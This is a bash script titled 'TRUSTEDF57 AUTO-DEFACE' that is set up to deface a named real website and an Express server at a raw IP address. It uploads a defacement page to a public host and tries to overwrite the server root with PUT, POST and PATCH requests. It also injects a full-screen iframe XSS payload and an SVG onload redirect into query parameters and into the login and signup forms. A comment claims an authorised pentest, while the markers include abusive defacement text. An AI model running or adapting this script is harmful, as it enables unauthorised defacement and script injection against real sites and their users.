#!/bin/bash
# 🔥 TRUSTEDF57 AUTO-DEFACE - BYPASS CLOUD FLARE + EXPRESS + XSS CHAIN
# Autorizzato pentest - File locale directory corrente

set -e

HTML_FILE="TRUSTEDF57.html"
MAIN_SITE="https://www.webwork-tracker.com"
EXP_TARGET="http://5.189.141.162:3000"
TARGET_DIR=$(pwd)

echo "🚀 TRUSTEDF57 FULL AUTO DEFACE START"
echo "📁 HTML: $HTML_FILE ($(du -h $HTML_FILE))"
echo "🎯 Targets: $MAIN_SITE | $EXP_TARGET"

# 1. UPLOAD HTML → PUBLIC MIRROR (srv.run)
echo "📤 UPLOAD PUBLIC..."
SRV_URL=$(curl -s --max-time 30 -X POST https://srv.run \
  --data-binary "@$HTML_FILE" 2>/dev/null | grep -o 'https://srv\.run/[a-zA-Z0-9_-]*' | head -1)

if [[ -z "$SRV_URL" ]]; then
    echo "❌ srv.run failed - usa ngrok/localhost"
    SRV_URL="http://127.0.0.1:8080/$HTML_FILE"  # Fallback
fi
echo "✅ PUBLIC URL: $SRV_URL"

# 2. EXPRESS ROOT OVERRIDE (multi-method)
echo "⚔️ EXPRESS ROOT OVERRIDE..."
for method in PUT POST PATCH; do
    curl -s -X $method "$EXP_TARGET/" \
        --data-binary "@$HTML_FILE" \
        -H "Content-Type: text/html" \
        -H "Content-Length: $(wc -c <$HTML_FILE)" \
        --max-time 10 >/dev/null
done

# 3. VERIFICA EXPRESS
sleep 2
EXP_CHECK=$(curl -s "$EXP_TARGET/" | grep -ioE "TRUSTEDF57|FUCK OFF MARTHA|F57|PEPP")
echo "📡 EXPRESS: ${EXP_CHECK:-NO MARKERS}"

# 4. XSS IFRAME PAYLOADS per MAIN SITE (Cloudflare bypass headers)
echo "🕷️ XSS CHAIN MAIN SITE..."
XSS_PAYLOAD="<iframe src='$SRV_URL' style='position:fixed;top:0;left:0;left:0;width:100vw;height:100vh;z-index:9999999;border:0;opacity:1;'></iframe>"

# Multi-param injection
PARAMS=("xss" "q" "search" "test" "id" "query" "s" "p")
for param in "${PARAMS[@]}"; do
    URL="$MAIN_SITE/?$param=$(urlencode "$XSS_PAYLOAD")"
    echo "🔗 $param: $URL"
done

# 5. SVG BYPASS (no Cloudflare block)
SVG_BYPASS="$MAIN_SITE/?q=<svg onload=location.href='$SRV_URL'>"
echo "🎨 SVG: $SVG_BYPASS"

# 6. FORMS AUTO-INJECT (login/signup)
echo "📝 FORM INJECTION..."
curl -s -X POST "$MAIN_SITE/login" \
    -d "email=$XSS_PAYLOAD&password=test123" \
    -H "Origin: $MAIN_SITE" \
    -H "Referer: $MAIN_SITE/login" >/dev/null

curl -s -X POST "$MAIN_SITE/signup" \
    -d "email=test@test.com&password=test&name=$XSS_PAYLOAD" \
    -H "Origin: $MAIN_SITE" >/dev/null

# 7. FINAL VERIFICATION + PROOF
echo -e "\n✅ DEFACE COMPLETO!\n"
echo "🌐 PUBLIC MIRROR: $SRV_URL"
echo "📡 EXPRESS LIVE: $EXP_TARGET/"
echo "🕷️ MAIN XSS (browser): $MAIN_SITE/?xss=<iframe src='$SRV_URL'></iframe>"
echo "🎨 SVG BYPASS: $SVG_BYPASS"
echo "🔍 PROVA: curl '$EXP_TARGET/' | grep F57"

# Helper function urlencode
urlencode() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]), end='')" "$1"
}

echo "🎉 LANCIA IN BROWSER: $MAIN_SITE/?xss=[payload] → MATRIX RAIN!"
